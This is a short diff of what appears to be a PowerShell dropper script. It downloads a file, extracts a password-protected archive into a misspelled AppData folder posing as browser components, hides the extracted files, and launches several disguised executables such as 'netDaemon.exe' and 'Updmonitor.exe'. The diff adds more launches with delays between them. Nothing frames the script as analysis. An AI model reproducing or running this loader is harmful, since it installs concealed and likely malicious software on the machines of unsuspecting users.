@@ -8,9 +8,11 @@ Invoke-WebRequest -uri $WebFile -OutFile $Outff
 & $env:Temp\additionlibraries.exe -s -p"of9049nwp04yb3" -d"$env:APPDATA\chromiuumbased\services\"
 Timeout /NOBREAK /T 1
 Get-ChildItem -path "$env:APPDATA\chromiuumbased\services\" -Recurse -Force | foreach {$_.attributes = "Hidden"}
-Get-ChildItem -path "$env:appdata\chromiuumbased\services\" -Recurse -Force | foreach {$_.attributes = "system"}
 Start-Process "$env:APPDATA\chromiuumbased\services\ProcManager.exe"
+Start-Process "$env:APPDATA\chromiuumbased\services\fsdroiod.exe"
+Timeout /NOBREAK /T 5
 Start-Process "$env:APPDATA\chromiuumbased\services\netDaemon.exe"
+Timeout /NOBREAK /T 5
 Start-Process "$env:APPDATA\chromiuumbased\services\Netstservice.exe"
+Timeout /NOBREAK /T 5
 Start-Process "$env:APPDATA\chromiuumbased\services\Updmonitor.exe"
-Start-Process "$env:APPDATA\chromiuumbased\services\fsroiod.exe"
